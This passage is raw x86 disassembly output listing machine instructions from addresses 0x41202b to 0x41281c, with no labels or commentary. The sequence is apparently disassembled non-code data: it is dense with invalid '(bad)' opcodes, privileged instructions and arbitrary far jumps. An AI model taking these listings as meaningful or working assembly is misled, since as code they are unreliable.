  41202b:	les    sp,DWORD PTR [eax+eax*4-0x64a0ba33]
  412033:	sbb    eax,0xe49cc002
  412038:	stos   DWORD PTR es:[edi],eax
  412039:	mov    al,ds:0xa667cd5f
  41203e:	pop    ebx
  41203f:	mov    ebx,0xaf304588
  412044:	dec    ebp
  412045:	inc    esp
  412046:	ret    0x4cd0
  412049:	addr16 fadd st(3),st
  41204c:	push   esi
  41204d:	push   ebp
  41204e:	inc    esp
  41204f:	test   al,0x9c
  412051:	mov    ah,0xd1
  412053:	jecxz  0x412013
  412055:	mov    esp,0xcbfbfd9f
  41205a:	mov    WORD PTR [esi-0x3d0f268b],gs
  412060:	lods   eax,DWORD PTR ds:[esi]
  412061:	mov    ds,WORD PTR [edx]
  412063:	aam    0x8d
  412065:	aam    0x41
  412067:	adc    ch,cl
  412069:	inc    edx
  41206a:	gs dec edi
  41206c:	rol    DWORD PTR ds:0xf2764b91,0x2d
  412073:	inc    esi
  412074:	push   ebx
  412075:	sbb    BYTE PTR [edx+edi*8],0x19
  412079:	mov    eax,0x957259dc
  41207e:	pop    es
  41207f:	adc    al,BYTE PTR [edi-0xb]
  412082:	sbb    cl,BYTE PTR [ebx-0x12]
  412085:	sub    ebx,0x7c
  412088:	shl    BYTE PTR [eax+0x7ca1bfcd],cl
  41208e:	mov    dl,0xa2
  412090:	dec    esp
  412091:	mov    al,ds:0x2aa69d4d
  412096:	mov    bl,BYTE PTR [ebx-0x2970186a]
  41209c:	(bad)  
  41209d:	xor    eax,DWORD PTR [eax]
  41209f:	ins    DWORD PTR es:[edi],dx
  4120a0:	shl    BYTE PTR [ecx+0x2d],0xde
  4120a4:	rol    DWORD PTR [ebx+0x24],cl
  4120a7:	test   BYTE PTR [ebx+0x6fa43796],dh
  4120ad:	leave  
  4120ae:	lods   al,BYTE PTR ds:[esi]
  4120af:	dec    edx
  4120b0:	outs   dx,BYTE PTR ds:[esi]
  4120b1:	retf   0xa3a8
  4120b4:	sub    eax,0xbb6ea2b7
  4120b9:	mov    dh,0x50
  4120bb:	les    edi,FWORD PTR [esi]
  4120bd:	adc    BYTE PTR [ecx],cl
  4120bf:	jae    0x412065
  4120c1:	xchg   edx,eax
  4120c2:	vpunpckhwd xmm2,xmm4,XMMWORD PTR [esi-0x1dcdf03]
  4120ca:	add    al,0x18
  4120cc:	das    
  4120cd:	mov    ecx,0xc0d6df96
  4120d2:	loope  0x41209a
  4120d4:	pop    ebp
  4120d5:	mov    esi,0x3e6f46d4
  4120da:	cwde   
  4120db:	inc    ebx
  4120dc:	test   eax,0x4509370d
  4120e1:	add    BYTE PTR [esi+0x6cee70a],0x91
  4120e8:	mov    edx,0x10fc63b0
  4120ed:	inc    ecx
  4120ee:	outs   dx,BYTE PTR ds:[esi]
  4120ef:	mov    al,0x1b
  4120f1:	push   ds
  4120f2:	adc    DWORD PTR [esi],esp
  4120f4:	xchg   edi,eax
  4120f5:	fld    QWORD PTR [edx+ebp*8-0x305353e]
  4120fc:	xor    eax,0x31cc17a0
  412101:	(bad)  
  412102:	int3   
  412103:	inc    esi
  412104:	ins    DWORD PTR es:[edi],dx
  412105:	push   esp
  412106:	mov    esp,0x7cb02bf4
  41210b:	pop    es
  41210c:	jg     0x412106
  41210e:	xor    BYTE PTR [eax],0x5c
  412111:	repnz sbb eax,0xc677e3a1
  412117:	mov    al,ds:0x4735f4ae
  41211c:	adc    DWORD PTR [ecx+0x6bca0309],ebp
  412122:	shr    BYTE PTR [ebx+0x897b638],cl
  412128:	mov    esi,0x575de8a9
  41212d:	jg     0x41215a
  41212f:	and    dh,BYTE PTR [bx-0x463d]
  412134:	cmp    ah,BYTE PTR [ebp-0x68]
  412137:	repnz xlat BYTE PTR ds:[ebx]
  412139:	dec    ebx
  41213a:	jecxz  0x4120ca
  41213c:	mov    ecx,0x1a49de8a
  412141:	ds stos DWORD PTR es:[edi],eax
  412143:	int3   
  412144:	xor    al,0xd7
  412146:	cmp    BYTE PTR [esi],ch
  412148:	mov    ch,0xad
  41214a:	scas   al,BYTE PTR es:[edi]
  41214b:	iret   
  41214c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41214d:	test   al,0x81
  41214f:	dec    esp
  412150:	add    esi,DWORD PTR [ebx]
  412152:	cmp    BYTE PTR ds:0x5715fa5f,0x89
  412159:	xchg   ebp,eax
  41215a:	icebp  
  41215b:	mov    eax,0x823ad14f
  412160:	mov    BYTE PTR [ecx],bh
  412162:	ins    DWORD PTR es:[edi],dx
  412163:	repnz push 0x1584f780
  412169:	inc    BYTE PTR [esi+eax*4+0x58]
  41216d:	out    0xb6,eax
  41216f:	test   al,0x97
  412171:	push   edi
  412172:	sub    DWORD PTR [edx],edi
  412174:	adc    BYTE PTR [esi],ch
  412176:	pop    ss
  412177:	inc    ebx
  412178:	sahf   
  412179:	inc    edx
  41217a:	adc    BYTE PTR [eax+0x25d363bd],dh
  412180:	xor    BYTE PTR [esi+esi*2+0x66],0x8a
  412185:	fmul   QWORD PTR [ebx]
  412187:	test   BYTE PTR [ecx],dh
  412189:	ss xchg ecx,eax
  41218b:	adc    al,BYTE PTR [edx-0x4dfad1ff]
  412191:	retf   
  412192:	loope  0x4121b7
  412194:	dec    edi
  412195:	push   esp
  412196:	adc    BYTE PTR [ebp+0x1f],ch
  412199:	icebp  
  41219a:	xchg   ecx,eax
  41219b:	fidivr WORD PTR [edx]
  41219d:	jmp    0xe5ad:0xbfdfadda
  4121a4:	sbb    dh,BYTE PTR [esi]
  4121a6:	jnp    0x41217f
  4121a8:	mov    al,0x24
  4121aa:	stc    
  4121ab:	outs   dx,BYTE PTR ds:[esi]
  4121ac:	(bad)  
  4121ad:	lds    ebx,FWORD PTR [esi-0x3268a8c0]
  4121b3:	mov    WORD PTR ds:0xd19fe03e,cs
  4121b9:	jge    0x4121df
  4121bb:	add    BYTE PTR [esi-0x1ab8b718],dh
  4121c1:	jne    0x412144
  4121c3:	pop    edi
  4121c4:	inc    esp
  4121c5:	outs   dx,BYTE PTR ds:[esi]
  4121c6:	pusha  
  4121c7:	sti    
  4121c8:	loope  0x41223d
  4121ca:	push   0x59d9c2a
  4121cf:	adc    BYTE PTR [ebp+0x5c46cd51],0xed
  4121d6:	scas   eax,DWORD PTR es:[edi]
  4121d7:	fdivr  QWORD PTR [edx-0x1667e13d]
  4121dd:	mov    edi,0x80313e9f
  4121e2:	or     BYTE PTR [edi],al
  4121e4:	sub    DWORD PTR [eax+0x323b3534],0xffffff94
  4121eb:	mov    esi,0xdfa2f70b
  4121f0:	cmp    eax,0xb0d756b7
  4121f5:	bound  ebx,QWORD PTR [eax+eax*4+0x6603b225]
  4121fc:	mov    cl,0x8f
  4121fe:	out    0x9d,al
  412200:	hlt    
  412201:	xchg   di,ax
  412203:	pusha  
  412204:	inc    ebx
  412205:	int3   
  412206:	mov    ebp,0xf00d35d8
  41220b:	cmp    DWORD PTR [ebx],eax
  41220d:	push   ebp
  41220e:	lds    ebp,FWORD PTR ds:0xdd843f82
  412214:	and    ah,bl
  412216:	lea    eax,[ecx-0x5de0454]
  41221c:	add    dl,bl
  41221e:	loop   0x4121e1
  412220:	call   0xec14ce74
  412225:	pop    esp
  412226:	ins    DWORD PTR es:[edi],dx
  412227:	sahf   
  412228:	repnz xchg dh,ah
  41222b:	lahf   
  41222c:	aaa    
  41222d:	mov    esi,0xeed68eb0
  412232:	add    DWORD PTR [edi],ecx
  412234:	jmp    0x412295
  412236:	imul   edx,DWORD PTR [esi],0x352a820f
  41223c:	xchg   ecx,eax
  41223d:	and    ebp,DWORD PTR [ecx+0x48]
  412240:	sbb    ebx,edi
  412242:	xor    eax,0xe32d59c4
  412247:	mov    bl,0xcd
  412249:	sub    al,BYTE PTR [edi]
  41224b:	push   eax
  41224c:	jno    0x41226c
  41224e:	cmp    bh,0x97
  412251:	in     eax,dx
  412252:	stos   DWORD PTR es:[edi],eax
  412253:	push   0xffffffd5
  412255:	xchg   edx,eax
  412256:	stos   DWORD PTR es:[edi],eax
  412257:	adc    BYTE PTR [eax-0x42700855],cl
  41225d:	inc    BYTE PTR [esi+ecx*4+0x6d4fd158]
  412264:	mov    bh,0x4d
  412266:	into   
  412267:	fnstsw ax
  412269:	pop    ecx
  41226a:	icebp  
  41226b:	arpl   WORD PTR [edi],dx
  41226d:	jg     0x4122d7
  41226f:	cdq    
  412270:	nop
  412271:	mov    ebp,0x725d06c3
  412276:	pop    esp
  412277:	fidivr DWORD PTR [esi-0x5f3252a7]
  41227d:	cmc    
  41227e:	cmp    al,BYTE PTR [edx+0x62]
  412281:	daa    
  412282:	cmp    ebp,DWORD PTR [ecx+0x5b103bd8]
  412288:	dec    ebp
  412289:	add    dh,dl
  41228b:	sar    edx,0x22
  41228e:	(bad)  
  41228f:	mov    esi,0x8be33050
  412294:	jmp    0x1eec78b6
  412299:	jb     0x412229
  41229b:	arpl   WORD PTR [ebp-0x79],dx
  41229e:	mov    edi,DWORD PTR [edx+0x5e]
  4122a1:	jl     0x41222d
  4122a3:	adc    ecx,DWORD PTR [edi-0x7d]
  4122a6:	and    esp,DWORD PTR [ebp+0xe]
  4122a9:	imul   ecx,DWORD PTR [esi-0x33044a90],0x3478707a
  4122b3:	in     eax,dx
  4122b4:	iret   
  4122b5:	push   ebp
  4122b6:	(bad)  
  4122b8:	cmp    al,0x31
  4122ba:	adc    DWORD PTR [esp+eax*1+0x5a],0x167ee9cc
  4122c2:	add    edi,ecx
  4122c4:	das    
  4122c5:	push   ecx
  4122c6:	xchg   ebx,eax
  4122c7:	retf   
  4122c8:	push   ecx
  4122c9:	ret    
  4122ca:	cdq    
  4122cb:	rcl    DWORD PTR [ebx],0x57
  4122ce:	xchg   ebx,eax
  4122cf:	adc    ecx,esp
  4122d1:	out    dx,eax
  4122d2:	je     0x412291
  4122d4:	gs pop edx
  4122d6:	dec    ebx
  4122d7:	dec    edi
  4122d8:	sub    eax,DWORD PTR [eax]
  4122da:	or     eax,ebx
  4122dc:	shr    edx,cl
  4122de:	mov    ch,0xf0
  4122e0:	mov    dh,0x15
  4122e2:	mov    dh,0x1a
  4122e4:	outs   dx,DWORD PTR ds:[esi]
  4122e5:	sub    eax,0x13828f6b
  4122ea:	sbb    al,0x5e
  4122ec:	push   ds
  4122ed:	ja     0x412357
  4122ef:	dec    ecx
  4122f0:	jnp    0x4122a3
  4122f2:	xchg   DWORD PTR [edi-0x3e],esp
  4122f5:	pop    ebp
  4122f6:	add    DWORD PTR [ecx],esp
  4122f8:	inc    eax
  4122f9:	dec    ebp
  4122fa:	aas    
  4122fb:	or     DWORD PTR [ecx+0x630ab6e9],edi
  412301:	int3   
  412302:	or     al,0xfc
  412304:	loopne 0x4122da
  412306:	jbe    0x41234e
  412308:	bound  edx,QWORD PTR [esi-0x36]
  41230b:	pop    esi
  41230c:	inc    edi
  41230d:	(bad)  
  41230e:	xor    eax,0xdb7d8846
  412313:	test   BYTE PTR [edi+0x35],cl
  412316:	pop    es
  412317:	mov    ds:0x64be3c93,eax
  41231c:	jecxz  0x4122f8
  41231e:	sbb    eax,0x3e3168b7
  412323:	jns    0x412323
  412325:	push   0x5110783e
  41232a:	cli    
  41232b:	sahf   
  41232c:	ret    0x7d17
  41232f:	mov    DWORD PTR ds:0x59bb1691,ebp
  412335:	gs js  0x4122cf
  412338:	sar    BYTE PTR [edi+0x64c5496f],0x69
  41233f:	pop    esp
  412340:	dec    edi
  412341:	pop    ds
  412342:	fwait
  412343:	das    
  412344:	or     edx,DWORD PTR [eax+0x12]
  412347:	sbb    ch,dh
  412349:	stos   BYTE PTR es:[edi],al
  41234a:	xchg   ebx,eax
  41234b:	jge    0x4122e6
  41234d:	xchg   esp,eax
  41234e:	in     al,dx
  41234f:	les    esp,FWORD PTR [ecx-0x4b]
  412352:	xchg   bl,al
  412354:	xor    ebx,ecx
  412356:	test   BYTE PTR [ebx+ebx*2-0x4f93c906],bh
  41235d:	mov    eax,0x795560ae
  412362:	dec    esp
  412363:	dec    ebx
  412364:	retf   0x62ea
  412367:	imul   ebx,DWORD PTR [esi-0x2f],0x1
  41236b:	cli    
  41236c:	mov    bh,0xc7
  41236e:	jg     0x412370
  412370:	push   cs
  412371:	jno    0x41238d
  412373:	das    
  412374:	pop    ebx
  412375:	ss sbb al,0xa
  412378:	mov    ecx,0x2159cff
  41237d:	int3   
  41237e:	xchg   ebp,eax
  41237f:	jge    0x4123c8
  412381:	call   0xc24a:0x96eeb4e7
  412388:	(bad)  
  412389:	xchg   ebp,eax
  41238a:	and    edi,DWORD PTR [eax]
  41238c:	adc    edi,DWORD PTR [eax-0x7b]
  41238f:	ror    edx,1
  412391:	mov    eax,ds:0xe039f00f
  412396:	jnp    0x412366
  412398:	imul   esp
  41239a:	pop    ecx
  41239b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239c:	(bad)  
  41239d:	cmp    DWORD PTR [edx+0x1e1b2ed6],eax
  4123a3:	lahf   
  4123a4:	out    0x87,al
  4123a6:	jnp    0x412366
  4123a8:	xor    eax,DWORD PTR [ebx+0x40249e08]
  4123ae:	fisub  WORD PTR [esi]
  4123b0:	pop    edi
  4123b1:	or     ebx,DWORD PTR [edx]
  4123b3:	fistp  QWORD PTR [eax]
  4123b5:	icebp  
  4123b6:	in     al,0xad
  4123b8:	inc    edi
  4123b9:	jb     0x41239b
  4123bb:	cmp    dh,dl
  4123bd:	jnp    0x41241a
  4123bf:	shl    dl,0xa7
  4123c2:	pop    ebx
  4123c3:	and    DWORD PTR [eax+0x57],0x48c13786
  4123ca:	stc    
  4123cb:	sub    DWORD PTR [ebx-0x4c64dae7],ecx
  4123d1:	fcom   QWORD PTR gs:[edx]
  4123d4:	push   ds
  4123d5:	int3   
  4123d6:	ss mov edi,0x9f595676
  4123dc:	inc    edx
  4123dd:	xlat   BYTE PTR ds:[ebx]
  4123de:	inc    DWORD PTR [esi+eax*2+0x2ee563ea]
  4123e5:	nop
  4123e6:	jl     0x41240f
  4123e8:	ins    BYTE PTR es:[edi],dx
  4123e9:	sub    DWORD PTR [ecx],edi
  4123eb:	loope  0x41245e
  4123ed:	les    ebp,FWORD PTR [edx-0x35]
  4123f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123f1:	addr16 inc edx
  4123f3:	sub    eax,0xe34bbd3b
  4123f8:	pop    ds
  4123f9:	push   es
  4123fa:	xchg   esi,eax
  4123fb:	or     eax,0x2f8909ab
  412400:	cmp    cl,bh
  412402:	adc    al,0x77
  412404:	and    ecx,ecx
  412406:	mov    dh,BYTE PTR [ebp+0x1]
  412409:	sbb    al,0x72
  41240b:	stos   BYTE PTR es:[edi],al
  41240c:	jmp    0x412439
  41240e:	and    eax,0xe269672c
  412413:	leave  
  412414:	push   0xc
  412416:	push   ss
  412417:	jl     0x41247c
  412419:	outs   dx,BYTE PTR ds:[esi]
  41241a:	push   0xb2369d9b
  41241f:	int3   
  412420:	imul   esp,DWORD PTR [edi+0x3b],0x59
  412424:	push   ebp
  412425:	xor    ecx,DWORD PTR [ebx+0x50]
  412428:	lock mov eax,ds:0x88361269
  41242e:	mov    ecx,0x4ab270b5
  412433:	cdq    
  412434:	and    ebp,DWORD PTR [ebp+0x3fc5b53f]
  41243a:	cmp    esi,DWORD PTR [ebx+0x30]
  41243d:	(bad)  
  41243e:	cmp    dh,ch
  412440:	adc    ebx,ebx
  412442:	je     0x41242c
  412444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412445:	fld    QWORD PTR [eax]
  412447:	in     al,0x32
  412449:	aas    
  41244a:	mov    eax,0xe8653cd8
  41244f:	add    DWORD PTR [edi-0x66],0xf8bd4444
  412456:	(bad)  
  412457:	mov    ds:0xd842f4ba,al
  41245c:	(bad)  
  41245d:	loopne 0x4124c7
  41245f:	sub    eax,0x909b1f3f
  412464:	adc    BYTE PTR [esi-0x7e],0xe
  412468:	add    BYTE PTR [edx+0x1c0069f9],bl
  41246e:	bound  edi,QWORD PTR [ebx-0x68]
  412471:	jecxz  0x4124d1
  412473:	rol    BYTE PTR [ecx+ebx*4-0x19],cl
  412477:	add    BYTE PTR [esi],dl
  412479:	pushf  
  41247a:	(bad)  
  41247b:	dec    ecx
  41247c:	call   0xe5f1:0xd3abb3d8
  412483:	fidiv  WORD PTR [edi]
  412485:	mov    al,0x88
  412487:	push   edi
  412488:	inc    esp
  412489:	xchg   edi,eax
  41248a:	lds    edx,FWORD PTR [edx+0x7a]
  41248d:	pop    ds
  41248e:	jno    0x412470
  412490:	inc    edx
  412491:	inc    esp
  412492:	(bad)  
  412493:	jmp    0x4124a6
  412495:	stc    
  412496:	jns    0x4124d1
  412498:	in     eax,dx
  412499:	xor    eax,0x4cb82dd4
  41249e:	int3   
  41249f:	jbe    0x412451
  4124a1:	jbe    0x4124eb
  4124a3:	imul   ebx,edi,0x3b
  4124a6:	ja     0x41249c
  4124a8:	cwde   
  4124a9:	cmp    eax,0xb8d18959
  4124ae:	sbb    cl,bh
  4124b0:	xchg   ecx,eax
  4124b1:	jno    0x412465
  4124b3:	jl     0x4124da
  4124b5:	or     al,0xc7
  4124b7:	fadd   QWORD PTR [edi-0x693754cb]
  4124bd:	setno  bl
  4124c0:	push   ebp
  4124c1:	add    al,0xa9
  4124c3:	push   esp
  4124c4:	ret    
  4124c5:	lods   eax,DWORD PTR ds:[esi]
  4124c6:	stc    
  4124c7:	add    dh,dl
  4124c9:	aad    0xcb
  4124cb:	into   
  4124cc:	shl    DWORD PTR ds:0x639f858d,cl
  4124d2:	shl    BYTE PTR [ebx+0x75],1
  4124d5:	mov    esi,0xa5092472
  4124da:	jp     0x4124ce
  4124dc:	ds enter 0xccf,0x1b
  4124e1:	(bad)  
  4124e3:	push   0xffffffdf
  4124e5:	pop    edi
  4124e6:	in     eax,dx
  4124e7:	xlat   BYTE PTR ds:[ebx]
  4124e8:	jns    0x412470
  4124ea:	and    bl,ch
  4124ec:	lahf   
  4124ed:	call   DWORD PTR [ecx+ecx*2+0x326e259]
  4124f4:	pop    edi
  4124f5:	sub    eax,0xf2a3b75f
  4124fa:	mov    DWORD PTR [ecx+eax*8+0x1f67ba5],esi
  412501:	jbe    0x41257c
  412503:	mov    esp,0x84a502e4
  412508:	gs push edx
  41250a:	mov    esi,0xded2c462
  41250f:	inc    ecx
  412510:	and    al,0xb
  412512:	inc    eax
  412513:	push   DWORD PTR [eax+0x59]
  412516:	xor    esp,edx
  412518:	popa   
  412519:	pop    edi
  41251a:	jmp    0x412585
  41251c:	jo     0x4124c3
  41251e:	pop    ebx
  41251f:	scas   eax,DWORD PTR es:[edi]
  412520:	test   BYTE PTR [esi+0x71],al
  412523:	ror    esi,cl
  412525:	sbb    bh,BYTE PTR [ebp+ebp*2+0x73]
  412529:	idiv   esi
  41252b:	imul   eax,DWORD PTR [esi-0x32],0x7f
  41252f:	pop    ss
  412530:	cmp    ah,0xab
  412533:	iret   
  412534:	aas    
  412535:	mov    BYTE PTR [ebx+0x5],cl
  412538:	xchg   DWORD PTR [edx-0x62],esi
  41253b:	xchg   ebx,eax
  41253c:	ficom  DWORD PTR [ebx-0x5b]
  41253f:	mov    esi,edx
  412541:	sbb    ecx,DWORD PTR [esi]
  412543:	ins    BYTE PTR es:[edi],dx
  412544:	inc    eax
  412545:	dec    ecx
  412546:	push   es
  412547:	jo     0x412508
  412549:	clc    
  41254a:	pop    esi
  41254b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41254c:	sub    eax,0xba278dd9
  412551:	jbe    0x41257b
  412553:	pop    ss
  412554:	jmp    0x7ff2:0x2ca956cf
  41255b:	icebp  
  41255c:	aam    0x29
  41255e:	jge    0x412528
  412560:	dec    edx
  412561:	and    eax,0xf680e194
  412566:	cmc    
  412567:	push   0xffffff95
  412569:	or     esp,DWORD PTR [ecx-0x22b68bd9]
  41256f:	sbb    al,0x7
  412571:	mov    ds:0x2d3c47a0,al
  412576:	stos   DWORD PTR es:[edi],eax
  412577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412578:	jbe    0x412529
  41257a:	and    dh,BYTE PTR [edx-0x31]
  41257d:	out    dx,al
  41257e:	jp     0x4125ee
  412580:	(bad)  
  412581:	pop    eax
  412582:	xor    DWORD PTR [ebx-0x6a],0x8b643bc4
  412589:	hlt    
  41258a:	ret    
  41258b:	jl     0x412558
  41258d:	pop    esi
  41258e:	sub    BYTE PTR [edx+0x3b],bh
  412591:	(bad)  
  412592:	cmp    eax,0xcf0aad32
  412597:	mov    al,0x6a
  412599:	mov    ch,0xc0
  41259b:	or     ebx,DWORD PTR [ebp-0x75b63089]
  4125a1:	jnp    0x41257c
  4125a3:	aas    
  4125a4:	retf   0x76e1
  4125a7:	lea    ecx,[ecx+0x3c79cbff]
  4125ad:	pop    edx
  4125ae:	fimul  DWORD PTR [esi-0x69]
  4125b1:	add    dl,ah
  4125b3:	shl    DWORD PTR [edi+edi*8-0x16],1
  4125b7:	cmp    eax,0x71cab2bd
  4125bc:	mov    esp,0xe8d02600
  4125c1:	aam    0xf
  4125c3:	inc    esp
  4125c4:	fs retf 
  4125c6:	mov    ds:0x150ad1b5,al
  4125cb:	in     eax,0xdd
  4125cd:	inc    edi
  4125ce:	mov    ebp,0x667dcde7
  4125d3:	push   0x8bff382f
  4125d8:	or     BYTE PTR [edx+0x292d809d],cl
  4125de:	cdq    
  4125df:	cwde   
  4125e0:	dec    edx
  4125e1:	outs   dx,BYTE PTR ds:[esi]
  4125e2:	sub    cl,BYTE PTR [edi]
  4125e4:	xor    al,0x82
  4125e6:	dec    al
  4125e8:	out    dx,al
  4125e9:	mov    ch,BYTE PTR [ebp-0x23]
  4125ec:	add    edi,eax
  4125ee:	sti    
  4125ef:	push   es
  4125f0:	stos   BYTE PTR es:[edi],al
  4125f1:	iret   
  4125f2:	in     eax,dx
  4125f3:	mov    ch,0xb4
  4125f5:	loope  0x41264f
  4125f7:	mov    bl,0x8
  4125f9:	stc    
  4125fa:	out    dx,al
  4125fb:	push   ecx
  4125fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125fd:	push   edi
  4125fe:	lods   al,BYTE PTR ds:[esi]
  4125ff:	mov    edx,eax
  412601:	or     ah,BYTE PTR [eax-0x5b94c4f4]
  412607:	push   ds
  412608:	sbb    BYTE PTR [ebx],bh
  41260a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41260b:	lods   al,BYTE PTR ds:[esi]
  41260c:	retf   0x3cc9
  41260f:	cmc    
  412610:	pop    es
  412611:	or     BYTE PTR [esi],0x2
  412614:	in     al,0x18
  412616:	push   edx
  412617:	out    0xf4,eax
  412619:	mov    edx,0xade02c5
  41261e:	jno    0x412608
  412620:	popf   
  412621:	mov    esp,0xd4d9910c
  412626:	jmp    DWORD PTR ss:[ecx+0x5440dee8]
  41262d:	imul   ebx,ecx,0x42
  412630:	cmc    
  412631:	xchg   BYTE PTR [ecx],dl
  412633:	std    
  412634:	(bad)  
  412636:	mov    esi,0x3d3fef88
  41263b:	rcl    DWORD PTR [esi+0x453dab77],1
  412641:	dec    DWORD PTR [ecx]
  412643:	jno    0x4125f1
  412645:	leave  
  412646:	push   0x3957921d
  41264b:	sbb    ebx,DWORD PTR [eax-0x61a833f4]
  412651:	sahf   
  412652:	in     al,0xe4
  412654:	xchg   ecx,eax
  412655:	adc    esi,DWORD PTR [ebx]
  412657:	aas    
  412658:	retf   
  412659:	pop    ds
  41265a:	mov    esi,0x4729744d
  41265f:	cmp    DWORD PTR [ebx],edx
  412661:	mov    dh,BYTE PTR [esi+edx*4]
  412664:	imul   ebx,ecx,0x768c67db
  41266a:	inc    esp
  41266b:	lds    ecx,FWORD PTR [eax]
  41266d:	inc    ebp
  41266e:	push   0x29eb941a
  412673:	cs das 
  412675:	dec    eax
  412676:	sbb    BYTE PTR [esi+0x2d],0xfe
  41267a:	inc    edi
  41267b:	imul   esp,ebp,0x646daa3a
  412681:	adc    eax,0x8d0d1eb3
  412686:	mov    bl,0xc1
  412688:	lahf   
  412689:	ret    0xd9c6
  41268c:	lock fisttp DWORD PTR [ebp-0x53]
  412690:	es push es
  412692:	push   0x27
  412694:	sub    dl,BYTE PTR [eax-0x25]
  412697:	mov    bh,0xe5
  412699:	or     BYTE PTR [esp+ebx*1],dh
  41269c:	mov    esp,0x6df69fff
  4126a1:	test   dh,dh
  4126a3:	jno    0x412703
  4126a5:	ss sahf 
  4126a7:	test   BYTE PTR [ecx+0x7d],ah
  4126aa:	ins    DWORD PTR es:[edi],dx
  4126ab:	lods   eax,DWORD PTR ds:[esi]
  4126ac:	shr    BYTE PTR ds:0xae5761e5,1
  4126b2:	ficom  DWORD PTR [esi]
  4126b4:	rcr    esp,cl
  4126b6:	loope  0x412675
  4126b8:	arpl   cx,di
  4126ba:	add    BYTE PTR [esi+0x15460a13],ah
  4126c0:	add    BYTE PTR [di+0x5e],ah
  4126c4:	scas   eax,DWORD PTR es:[edi]
  4126c5:	xchg   DWORD PTR [eax-0x40],eax
  4126c8:	test   eax,0x56a0861a
  4126cd:	test   al,0xf5
  4126cf:	data16 arpl bp,sp
  4126d2:	mov    ebx,0xe89c5dd5
  4126d7:	outs   dx,DWORD PTR ds:[esi]
  4126d8:	adc    cl,al
  4126da:	mov    ?,esi
  4126dc:	mov    ebx,0xd80fded0
  4126e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126e2:	std    
  4126e3:	test   eax,0x6bf1b425
  4126e8:	sti    
  4126e9:	add    al,0x53
  4126eb:	imul   ebx,DWORD PTR [ebx-0x12ba955d],0xfffffffb
  4126f2:	test   BYTE PTR [edx+0x4c9bd518],ah
  4126f8:	xchg   edx,eax
  4126f9:	(bad)  
  4126fa:	ret    0xd635
  4126fd:	cdq    
  4126fe:	cmc    
  4126ff:	(bad)  
  412700:	mov    edx,0x9af15f81
  412705:	sbb    eax,0x2b0cd4df
  41270a:	shr    eax,0xc
  41270d:	jb     0x412702
  41270f:	dec    edx
  412710:	mov    esp,0x36e12a05
  412715:	and    eax,0x71cc2743
  41271a:	(bad)  
  41271b:	jp     0x4126f5
  41271d:	nop
  41271e:	dec    ecx
  41271f:	sbb    dh,BYTE PTR [eax-0x21]
  412722:	test   BYTE PTR [ecx],dh
  412724:	(bad)  
  412725:	mov    al,0x4e
  412727:	sbb    eax,edx
  412729:	mov    eax,ds:0xffa2d1e4
  41272e:	arpl   WORD PTR [esi+0x5e],si
  412731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412732:	pop    ds
  412733:	xchg   ebx,eax
  412734:	or     eax,0x28dcedee
  412739:	(bad)  
  41273a:	mov    cl,0xd8
  41273c:	jns    0x4127a5
  41273e:	popf   
  41273f:	adc    BYTE PTR [edx],al
  412741:	dec    ecx
  412742:	call   0xa117:0xb795ba3
  412749:	mov    gs,WORD PTR [ecx+0x32]
  41274c:	mov    ebp,DWORD PTR [ebx+0x216cef2c]
  412752:	mov    esp,esi
  412754:	pusha  
  412755:	jle    0x41272a
  412757:	scas   al,BYTE PTR es:[edi]
  412758:	icebp  
  412759:	mov    ecx,0x84b2f0a7
  41275e:	daa    
  41275f:	fmul   QWORD PTR [ebx+ecx*8-0x5c20c99]
  412766:	(bad)  
  412768:	add    BYTE PTR [edi+0x150c62d0],ah
  41276e:	mov    esp,0x28116ac6
  412773:	test   BYTE PTR [eax],dl
  412775:	lds    ebp,FWORD PTR ds:0x4fcacb4b
  41277b:	push   ss
  41277c:	mov    ebp,0xbd6ad8a3
  412781:	push   edx
  412782:	dec    edx
  412783:	addr16 mov bh,0xeb
  412786:	sub    ebp,ecx
  412788:	mov    fs:0x911ed2c8,eax
  41278e:	add    BYTE PTR ss:[edx-0x43b8f607],bh
  412795:	add    BYTE PTR [edi+eax*2-0x532bc83d],bl
  41279c:	sub    ebp,ecx
  41279e:	sbb    esp,DWORD PTR [ecx]
  4127a0:	mov    WORD PTR [ebp-0x44],es
  4127a3:	call   0xb69832b9
  4127a8:	fstp   TBYTE PTR [ebp+eax*1+0x52fd956b]
  4127af:	xor    ecx,eax
  4127b1:	fistp  DWORD PTR [edi]
  4127b3:	cwde   
  4127b4:	es jae 0x41277e
  4127b7:	xchg   edx,eax
  4127b8:	xchg   BYTE PTR [edx+0x55929d16],ch
  4127be:	add    BYTE PTR [edi+0x3f],al
  4127c1:	mov    dl,0x93
  4127c3:	sbb    DWORD PTR [eax-0x48e6166e],eax
  4127c9:	sub    eax,0x9721eaf8
  4127ce:	lahf   
  4127cf:	stc    
  4127d0:	fcom   QWORD PTR [edx]
  4127d2:	es enter 0xd1cc,0xbb
  4127d7:	sbb    al,0x3f
  4127d9:	test   eax,0x2587abbe
  4127de:	in     al,dx
  4127df:	fstp   DWORD PTR [eax+0x4]
  4127e2:	mov    edi,0xacb5bdd3
  4127e7:	mov    al,0xb6
  4127e9:	and    DWORD PTR [esi+0x19],0xffffff84
  4127ed:	sub    bl,BYTE PTR [edi-0x6c]
  4127f0:	or     al,0xd1
  4127f2:	add    BYTE PTR [eax+0x75],dh
  4127f5:	es push ecx
  4127f7:	jecxz  0x4127d6
  4127f9:	sbb    al,0x81
  4127fb:	inc    ecx
  4127fc:	pop    eax
  4127fd:	jmp    0x4127e1
  4127ff:	(bad)  
  412800:	shl    DWORD PTR [eax+edi*1],1
  412803:	sub    BYTE PTR [edi+0x5dba410d],bl
  412809:	mov    bh,0x5f
  41280b:	pop    eax
  41280c:	or     esi,edi
  41280e:	mov    esi,0xb9190c0f
  412813:	cwde   
  412814:	inc    ecx
  412815:	dec    edx
  412816:	adc    ecx,ebx
  412818:	xor    DWORD PTR [esi],ebp
  41281a:	daa    
  41281b:	inc    ebp
  41281c:	jne    0x412892
